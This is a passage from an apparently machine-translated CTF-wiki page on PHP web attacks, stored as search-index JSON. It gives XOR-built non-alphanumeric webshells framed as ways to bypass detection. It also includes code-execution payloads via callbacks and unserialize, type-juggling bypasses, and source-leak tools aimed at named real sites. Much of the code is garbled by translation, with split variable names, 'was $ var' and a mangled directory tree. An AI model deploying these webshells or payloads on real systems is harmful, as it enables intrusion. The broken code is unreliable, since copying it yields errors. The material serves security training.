and get the result <code>B</code> assigned to the variable named <code>__</code> (two underscores)</p> <p>3, <code>$ __ ();</code> Through the above assignment operation, the value of the variable <code>$__</code> is <code>B</code>, so this line can be regarded as <code>B()</code>. In <code>PHP</code>, this line of code represents The function <code>B</code> is called, so the result is <code>Hello Angel_Kitty</code>. In <code>PHP</code>, we can treat strings as functions.</p> <p>Seeing this, I believe that if you see a similar <code>PHP</code> backdoor, you should not be so confused. You can use the sentence analysis of the backdoor code to understand the functions that the backdoor wants to achieve.</p> <p>We want to use this backdoor to create strings that bypass the detection and are useful to us, such as <code>_POST</code> , <code>system</code> , <code>call_user_func_array</code>, or whatever we need.</p> <p>Here is a very simple non-alphanumeric <code>PHP</code> backdoor:</p> <pre><code>&lt;?php\n\n    @$_++; // $_ = 1\n\n    $__=(\"#\"^\"|\"); // $__ = _\n\n    $__.=(\".\"^\"~\"); // _P\n\n$ __. = (&amp;quot;/&amp;quot; ^ &amp;quot;` &amp;quot;); // _PO\n$ __. = (&amp;quot;|&amp;quot; ^ &amp;quot;/&amp;quot;); // _POS\n    $__.=(\"{\"^\"/\"); // _POST \n\n    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);\n\n?&gt;\n</code></pre> <p>Here I explain, <code>.=</code> is a string connection, see <code>PHP</code> syntax for details.</p> <p>We can even merge the above code into one line, making the program less readable, the code is as follows:</p> <pre><code>$__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"{\"^\"/\");\n</code></pre> <p>Looking back at the question of the <code>xman</code> training, our idea is to bypass the string of characters by constructing XOR, so how do we construct this string so that the length is less than <code>40</code>?</p> <p>We finally want to read the <code>getFlag</code> function, we need to construct a <code>_GET</code> to read this function, we finally construct the following string:</p> <p></p> <p>It may be that many small partners still can't understand how this string is constructed. Let's analyze the segment string.</p>"},{"location":"web/php/php/#construct-_get-read","title":"Construct <code>_GET</code> Read","text":"<p>First of all, we have to know what X_GET` is from XOR. After my attempts and analysis, I came to the following conclusion:</p> <pre><code>&lt;?php\n\n    echo \"`{{{\"^\"?&lt;&gt;/\";//_GET\n\n?&gt;\n</code></pre> <p>What is the meaning of this code? Because of the 40-character length limit, webshells that were previously XOR-to-character-spliced cannot be used. Here you can use the backquotes <code>`</code> and <code>Linux</code> under the php php to execute the command <code>?</code></p> <ul> <li><code>?</code> means matching one character</li> <li><code>`</code> indicates execution of the command</li> <li><code>`</code> Parsing a special string</li> </ul> <p>Since <code>?</code> can only match one character, this way of writing means looping and matching. We will break it down to see:</p> <pre><code>&lt;?php\n\n    echo \"{\"^\"&lt;\";\n\n?&gt;\n</code></pre> <p>The output is:</p> <p></p> <pre><code>&lt;?php\n\n    echo \"{\"^\"&gt;\";\n\n?&gt;\n</code></pre> <p>The output is:</p> <p></p> <pre><code>&lt;?php\n\n    echo \"{\"^\"/\";\n\n?&gt;\n</code></pre> <p>The output is:</p> <p></p> <p>So we can know that <code>_GET</code> is constructed like this!</p>"},{"location":"web/php/php/#get-the-_get-parameter","title":"Get the <code>_GET</code> parameter","text":"<p>How do we get the <code>_GET</code> parameter? We can construct the following string:</p> <pre><code>&lt;?php\n\n    echo ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__])\n\n?&gt;\n</code></pre> <p>According to the previous construction, <code>$_</code> has become <code>_GET</code>. Naturally, <code>$_ = _GET</code>. We built <code>$_GET[__]</code> to get the parameter values.</p>"},{"location":"web/php/php/#incoming-parameters","title":"Incoming parameters","text":"<p>At this point we just need to call the <code>getFlag</code> function to get the <code>webshell</code> just fine, constructed as follows:</p> <pre><code>&lt;?php\n\n    echo $_=getFlag;//getFlag\n\n?&gt;\n</code></pre> <p>So connect all the parameters and you're done.</p> <p></p> <p>The results are as follows:</p> <p></p> <p>So we successfully read the flag!</p>"},{"location":"web/php/php/#dynamic-function-execution","title":"Dynamic function execution","text":"<p>User-defined functions can lead to code execution.</p> <pre><code>&lt;?php\n\n$ dyn_func = $ _GET [&amp;quot;dyn_func&amp;quot;];\n$argument = $_GET[\"argument\"];\n\n$ dyn_func ($ argument);\n?&gt;\n</code></pre>"},{"location":"web/php/php/#backquote-command-execution","title":"Backquote command execution","text":"<pre><code>&lt;?php\n\necho `ls -al`;\n?&gt;\n</code></pre>"},{"location":"web/php/php/#curly-syntax","title":"Curly Syntax","text":"<p>PHP's Curly Syntax can also lead to code execution, it will execute the code between the curly braces and replace the results.</p> <pre><code>&lt;?php\n\n$ var = &amp;quot;aaabbbccc $ {` ls`} &amp;quot;;\n?&gt;\n</code></pre> <pre><code>&lt;?php\n\n$foobar = \"phpinfo\";\n\n$ {&amp;quot;foobar&amp;quot;} ();\n?&gt;\n</code></pre>"},{"location":"web/php/php/#callback","title":"Callback","text":"<p>Many functions can execute callback functions, which will cause code execution when the callback function is controllable by the user.</p> <pre><code>&lt;?php\n\n$evil_callback = $_GET[\"callback\"];\n\n$some_array = array(0,1,2,3);\n\n$new_array = array_map($evil_callback, $some_array);\n\n?&gt;\n</code></pre> <p>Attack payload</p> <pre><code>http://www.a.com/index.php?callback=phpinfo\n</code></pre>"},{"location":"web/php/php/#deserialization","title":"Deserialization","text":"<p>If <code>unserialize()</code> defines a <code>__destruct()</code> or <code>__wakeup()</code> function at execution time, it may cause code execution.</p> <pre><code>&lt;?php\n\nclass Example {\n\nwas $ var = &amp;quot;&amp;quot;;\n  function __destruct() {\n\n    eval($this-&gt;var);\n\n  }\n\n}\n\nunserialize($_GET[\"saved_code\"]);\n\n?&gt;\n</code></pre> <p>Attack payload</p> <pre><code>http://www.a.com/index.php?saved_code=O:7:\"Example\":1:{s:3:\"var\";s:10:\"phpinfo();\";}\n</code></pre>"},{"location":"web/php/php/#php-features","title":"PHP Features","text":""},{"location":"web/php/php/#array","title":"Array","text":"<pre><code>&lt;?php\n\n$ var = 1;\n$ var = array ();\n$ var = &amp;quot;string&amp;quot;;\n?&gt;\n</code></pre> <p>Php does not strictly check incoming variable types, nor can it convert types freely.</p> <p>For example, in the comparison of <code>$a == $b</code></p> <pre><code>$a = null; \n\n$b = false; // is true\n$a = ''; \n\n$b = 0; //also true\n</code></pre> <p>However, the developers of the PHP kernel originally wanted to let programmers develop more efficiently with this system that does not require declarations, so many loosely used comparisons and transformations were used in almost all built-in functions and basic structures to prevent programs from being used. The variables are frequently reported incorrectly because of the programmer's irregularity, but this brings security problems.</p> <pre><code>0=='0' //true\n\n0 == 'abcdefg' //true\n\n0 === 'abcdefg' //false\n\n1 == '1abcdef' //true\n</code></pre>"},{"location":"web/php/php/#magic-hash","title":"Magic Hash","text":"<pre><code>\"0e132456789\"==\"0e7124511451155\" //true\n\n\"0e123456abc\"==\"0e1dddada\" //false\n\n\"0e1abc\"==\"0\"  //true\n</code></pre> <p>When a comparison operation is performed, if a string such as <code>0e\\d+</code> is encountered, the string is parsed into scientific notation. So the values of the two numbers in the above example are all 0 and thus equal. If the pattern of <code>0e\\d+</code> is not satisfied, it will not be equal.</p>"},{"location":"web/php/php/#hex-conversion","title":"hex conversion","text":"<pre><code>\"0x1e240\"==\"123456\" //true\n\n\"0x1e240\"==123456 //true\n\n\"0x1e240\"==\"1e240\" //false\n</code></pre> <p>When one of the strings starts with <code>0x</code>, PHP parses the string into decimal and then compares it. <code>0x1240</code> parsing into decimal is 123456, so with the <code>int</code> type and the <code>string</code> type of 123456 The comparisons are all equal.</p>"},{"location":"web/php/php/#type-conversion","title":"Type conversion","text":"<p>The common conversions are mainly <code>int</code> converted to <code>string</code>, <code>string</code> converted to <code>int</code>.</p> <p><code>int</code> turn <code>string</code></p> <pre><code>$ var = 5;\nMethod 1: $item = (string) $var;\nMethod 2: $item = strval($var);\n</code></pre> <p><code>string</code> turns <code>int</code>:<code>intval()</code> function.</p> <p>For this function, you can look at 2 examples first.</p> <pre><code>var_dump (intval (&amp;#39;2&amp;#39;)) // 2\nvar_dump (intval (&amp;#39;3abcd&amp;#39;)) // 3\nvar_dump (intval (&amp;#39;abcd&amp;#39;)) // 0\n</code></pre> <p>When the <code>intval()</code> conversion is specified, it will be converted from the beginning of the string to know that a non-numeric character has been encountered. Even if there is a string that cannot be converted, <code>intval()</code> will not report an error but return 0.</p> <p>At the same time, programmers should not use the following code when programming:</p> <pre><code>if(intval($a)&gt;1000) {\n\n mysql_query(\"select * from news where id=\".$a)\n\n}\n</code></pre> <p>At this time, the value of <code>$a</code> may be <code>1002 union</code>.</p>"},{"location":"web/php/php/#looseness-of-parameters-of-built-in-functions","title":"Looseness of parameters of built-in functions","text":"<p>The looseness of the built-in function is that when the function is called, the function is passed to the function type that the function cannot accept. Explain a bit of a mouthful, or directly through the actual examples to illustrate the problem, the following will focus on a few of these functions.</p> <p>md5()</p> <pre><code>$array1[] = array(\n\n \"foo\" =&gt; \"bar\",\n\n \"bar\" =&gt; \"foo\",\n\n);\n\n$array2 = array(\"foo\", \"bar\", \"hello\", \"world\");\n\nvar_dump (md5 ($ array1) == md5 ($ array2)); //threaten\n</code></pre> <p>The description of the md5() function in the PHP manual is <code>string md5 ( string $str [, bool $raw_output = false ] )</code>, and the requirement in <code>md5()</code> is a string type parameter. But when you pass an array, <code>md5()</code> will not report an error, but will not be able to correctly find the md5 value of the array, which will cause the md5 values of any 2 arrays to be equal.</p> <p>strcmp()</p> <p>The <code>strcmp()</code> function is described in the official PHP manual as <code>intstrcmp ( string $str1 , string $str2 )</code>, which needs to pass 2 arguments of type <code>string</code> to <code>strcmp()</code>. If <code>str1</code> is less than <code>str2</code>, it returns -1, and equality returns 0, otherwise it returns 1. The essence of the <code>strcmp()</code> function to compare strings is to convert two variables to ASCII, then perform the subtraction, and then determine the return value based on the result of the operation.</p> <p>What if the argument that gives <code>strcmp()</code> is a number?</p> <pre><code>$array=[1,2,3];\n\nVar_dump(strcmp($array,&amp;#39;123&amp;#39;)); //null, in a sense null is equivalent to false.\n</code></pre> <p>switch()</p> <p>If <code>switch()</code> is a case of a numeric type, switch will convert the parameters to an int. as follows:</p> <pre><code>$i =\"2abc\";\n\nswitch ($i) {\n\ncase 0:\n\ncase 1:\n\ncase 2:\n\n echo \"i is less than 3 but not negative\";\n\n break;\n\ncase 3:\n\n echo \"i is 3\";\n\n}\n</code></pre> <p>At this time, the program outputs <code>i is less than 3 but not negative</code> because the <code>switch()</code> function converts <code>$i</code> and the result is 2.</p> <p>in_array()</p> <p>In the PHP manual, the <code>in_array()</code> function is interpreted as <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code> . If the strict parameter is not provided, then <code>in_array</code> will be loose. Compare to see if <code>$needle</code> is in <code>$haystack</code>. When the value of strict is true, <code>in_array()</code> compares the type of needls with the type in haystack.</p> <pre><code>$array=[0,1,2,'3'];\n\nvar_dump(in_array('abc', $array)); //true\n\nvar_dump(in_array('1bc', $array)); //true\n</code></pre> <p>You can see that the above case returns true, because <code>&amp;#39;abc&amp;#39;</code> will be converted to 0, and <code>&amp;#39;1bc&amp;#39;</code> will be converted to 1.</p> <p><code>array_search()</code> is the same as <code>in_array()</code>.</p>"},{"location":"web/php/php/#looking-for-source-code-backup","title":"Looking for source code backup","text":""},{"location":"web/php/php/#hg-source-code-leak","title":"hg Source code leak","text":"<p><code>`hg</code> files are generated when <code>hg init</code>.</p> <p>[Using the tool dvcs-ripper] (https://github.com/kost/dvcs-ripper)</p>"},{"location":"web/php/php/#git-source-leaks","title":"Git Source leaks","text":"<p>The <code>.git</code> directory contains files such as code change records. If the files in this directory are accessible when deployed, they may be used to restore the source code.</p> <pre><code>/.git\n\n/.git/HEAD\n\n/.git/index\n\n/.git/config\n\n/.git/description\n</code></pre> <p>GitHack</p> <pre><code>python GitHack.py http://www.openssl.org/.git/\n</code></pre> <p>[GitHacker (Recoverable Full Git Repository)] (https://github.com/WangYihang/GitHacker)</p> <pre><code>python GitHacker.py http://www.openssl.org/.git/\n</code></pre>"},{"location":"web/php/php/#ds_store-file-leaked","title":"<code>.DS_Store</code> File leaked","text":"<p>Mac OS will contain a <code>.DS_Store</code> file containing information such as the file name.</p> <p>[Using the tool ds_store_exp] (https://github.com/lijiejie/ds_store_exp)</p> <pre><code>python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store\n\n\n\nhd.zj.qq.com/\n\n\u2514\u2500\u2500 themes\n\nAxy\u2500\u2500 galaxyw\n        \u251c\u2500\u2500 app\n\n        \u2502   \u2514\u2500\u2500 css\n\n        \u2502       \u2514\u2500\u2500 style.min.css\n\n\u251c\u2500\u2500 cityData.min.js\n        \u251c\u2500\u2500 images\n\n        \u2502   \u2514\u2500\u2500 img\n\n        \u2502       \u251c\u2500\u2500 bg-hd.png\n\n        \u2502       \u251c\u2500\u2500 bg-item-activity.png\n\n\u2502 \u251c\u2500\u2500 bg-mask-pop.png\n\u2502 \u251c\u2500\u2500 btn-bm.png\n        \u2502       \u251c\u2500\u2500 btn-login-qq.png\n\n        \u2502       \u251c\u2500\u2500 btn-login-wx.png\n\n        \u2502       \u251c\u2500\u2500 ico-add-pic.png\n\n        \u2502       \u251c\u2500\u2500 ico-address.png\n\n        \u2502       \u251c\u2500\u2500 ico-bm.png\n        \u2502       \u251c\u2500\u2500 ico-duration-time.png\n\n        \u2502       \u251c\u2500\u2500 ico-pop-close.png\n\n        \u2502       \u251c\u2500\u2500 ico-right-top-delete.png\n\n        \u2502       \u251c\u2500\u2500 page-login-hd.png\n\n\u2502 \u251c\u2500\u2500 pic-topeng.png\n        \u2502       \u2514\u2500\u2500 ticket-selected.png\n\n        \u2514\u2500\u2500 member\n\n            \u251c\u2500\u2500 assets\n\n            \u2502   \u251c\u2500\u2500 css\n\n            \u2502   \u2502   \u251c\u2500\u2500 ace-reset.css\n\n\u2514 \u2514\u2500\u2500 antd.css\n            \u2502   \u2514\u2500\u2500 lib\n\n\u2502 \u251c\u2500\u2500 cityData.min.js\n\u2502 \u2514\u2500\u2500 ueditor\n            \u2502           \u251c\u2500\u2500 index.html\n\n\u2502 \u251c\u2500\u2500 lang\nZh-\u2502 \u2502 \u2514\u2500\u2500\n            \u2502           \u2502       \u251c\u2500\u2500 images\n\n            \u2502           \u2502       \u2502   \u251c\u2500\u2500 copy.png\n\n            \u2502           \u2502       \u2502   \u251c\u2500\u2500 localimage.png\n\n            \u2502           \u2502       \u2502   \u251c\u2500\u2500 music.png\n\n            \u2502           \u2502       \u2502   \u2514\u2500\u2500 upload.png\n\n\u2502 \u2502 \u2514\u2500\u2500 zh cn.js\n            \u2502           \u251c\u2500\u2500 php\n\n            \u2502           \u2502   \u251c\u2500\u2500 action_crawler.php\n\n            \u2502           \u2502   \u251c\u2500\u2500 action_list.php\n\n            \u2502           \u2502   \u251c\u2500\u2500 action_upload.php\n\n            \u2502           \u2502   \u251c\u2500\u2500 config.json\n\n            \u2502           \u2502   \u251c\u2500\u2500 controller.php\n\n            \u2502           \u2502   \u2514\u2500\u2500 Uploader.class.php\n\n            \u2502           \u251c\u2500\u2500 ueditor.all.js\n\n\u2502 \u251c\u2500\u2500 ueditor.all.min.js\n            \u2502           \u251c\u2500\u2500 ueditor.config.js\n\n            \u2502           \u251c\u2500\u2500 ueditor.parse.js\n\n\u2502 \u2514\u2500\u2500 ueditor.parse.min.js\n            \u2514\u2500\u2500 static\n\n                \u251c\u2500\u2500 css\n\n                \u2502   \u2514\u2500\u2500 page.css\n\n                \u251c\u2500\u2500 img\n\n                \u2502   \u251c\u2500\u2500 bg-table-title.png\n\n                \u2502   \u251c\u2500\u2500 bg-tab-say.png\n\n                \u2502   \u251c\u2500\u2500 ico-black-disabled.png\n\n                \u2502   \u251c\u2500\u2500 ico-black-enabled.png\n\n                \u2502   \u251c\u2500\u2500 ico-coorption-person.png\n\n                \u2502   \u251c\u2500\u2500 ico-miss-person.png\n\n                \u2502   \u251c\u2500\u2500 ico-mr-person.png\n\n                \u2502   \u251c\u2500\u2500 ico-white-disabled.png\n\n                \u2502   \u2514\u2500\u2500 ico-white-enabled.png\n\n                \u2514\u2500\u2500 scripts\n\n\u251c\u2500\u2500 js\n                    \u2514\u2500\u2500 lib\n\n\u2514\u2500\u2500 jquery.min.js\n\n\n21 directories, 48 files\n</code></pre>"},{"location":"web/php/php/#website-backup-file","title":"Website backup file","text":"<p>The administrator incorrectly placed the backup under the web directory after backing up the website file.</p> <p>Common suffixes:</p> <pre><code>.rar\n\n.zip\n\n7.z\ntar\n.tar.gz\n.behind\n.txt\n</code></pre>"},{"location":"web/php/php/#svn-leak","title":"SVN Leak","text":"<p>Sensitive documents:</p> <pre><code>/.svn\n\n/.svn/wc.db\n\n/.svn/entries\n</code></pre> <p>dvcs-ripper</p> <pre><code>perl rip-svn.pl -v -u http://www.example.com/.svn/\n</code></pre> <p>[Seay - SVN] (http://tools.40huo.cn/#!web.md# source leak)</p>"},{"location":"web/php/php/#web-inf-webxml-leaked","title":"WEB-INF / web.xml leaked","text":"<p>WEB-INF is a secure directory for Java web applications, and there are file mappings in web.xml.</p> <p>WEB-INF mainly contains the following files or directories:</p> <ul> <li><code>/WEB-INF/web.xml</code> : Web application configuration file that describes the servlet and other application component configuration and naming rules.</li> <li><code>/WEB-INF/classes/</code> : Contains all the class files used by the site, including servlet class and non-servlet class, they cannot be included. In the jar file.</li> <li><code>/WEB-INF/lib/</code> : Stores various jar files required by the web application, and places jar files that are only required in this application, such as database driver jar files.</li> <li><code>/WEB-INF/src/</code> : source directory, each java file is placed according to the package name structure.</li> <li><code>/WEB-INF/database.properties</code> : Database configuration file.</li> </ul> <p>By finding the web.xml file, inferring the path to the class file, and finally by directly classifying the file, the website source code is obtained by decompiling the class file. In general, the jsp engine is forbidden to access the WEB-INF directory by default. When Nginx works with Tomcat to balance load or cluster, the cause of the problem is actually very simple. Nginx will not consider configuring other type engines (Nginx is not a jsp engine). The security issue is introduced into its own security specification (so that the coupling is too high), modifying the Nginx configuration file to block access to the WEB-INF directory is fine:</p> <pre><code>Location ~ ^/WEB-INF/* { deny all; } # or return 404; or other!\n</code></pre>"},{"location":"web/php/php/#cvs-leak","title":"CVS Leak","text":"<pre><code>Http://url/CVS/Root returns the root information\nHttp://url/CVS/Entries returns the structure of all files\n</code></pre> <p>Retrieve source code</p> <pre><code>bk clone http://url/name dir\n</code></pre>"},{"location":"web/php/php/#references","title":"references","text":"<ul> <li>Remember the pit that the webshell stepped on (how to write a backdoor that does not contain numbers and letters in PHP)</li> </ul>"}]}